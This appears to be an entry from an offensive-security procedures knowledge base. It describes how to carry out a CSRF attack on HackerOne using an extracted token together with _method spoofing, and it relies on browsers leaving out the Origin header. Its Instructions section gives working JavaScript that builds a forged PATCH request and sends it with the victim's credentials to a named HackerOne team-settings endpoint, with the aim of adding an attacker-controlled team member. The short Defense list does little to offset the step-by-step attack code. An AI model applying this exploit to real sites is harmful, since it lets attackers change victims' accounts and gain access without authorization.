---
id: proc-csrf-execute-001
tags:
  - csrf
  - method-spoofing
  - unauthorized-actions
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:35.792Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute CSRF Attack with Extracted Token

## Summary

This procedure forges requests using the extracted CSRF token to perform unauthorized actions on HackerOne, such as adding malicious team members, leveraging _method spoofing for PATCH/DELETE and incomplete Origin header mitigations.

## Description

With the token, the malicious page sends POST requests mimicking form submissions, including the token and _method= PATCH/DELETE to spoof HTTP methods. Browsers like Firefox and IE omit Origin headers on forms, bypassing checks. Targets include team management endpoints to grant report access. Outcome: Account modifications without user interaction.

## Requirements

1. Extracted CSRF token from prior step
2. Knowledge of HackerOne form structures (e.g., profile/team edit)
3. Victim's session active

## Defense

Defensive measures and detection strategies:

- Implement per-action token binding
- Enforce Origin and Referer header validation universally
- Rate-limit and monitor for rapid successive modifications

## Objectives

1. Forge authenticated requests with valid token
2. Perform actions like adding team members
3. Achieve persistence or data access

## Instructions

### Step 1: Craft Forged Request

**Context**: Prepare POST data with token and spoofed method.

In JavaScript:

```javascript
var formData = new FormData();
formData.append('_method', 'PATCH');
formData.append('csrf_token', extractedToken);
formData.append('user[email]', 'malicious@example.com'); // e.g., add team member
```

> Builds the payload for team addition. Expected output: FormData object ready.

### Step 2: Submit to Target Endpoint

**Context**: Send the request to bypass CSRF protections.

Execute:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://hackerone.com/settings/teams/update', true);
xhr.withCredentials = true;
xhr.send(formData);
```

> Submits to team update endpoint. Expected output: 200 OK with updated team reflected.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- rails-exploitation
- unauthorized-access
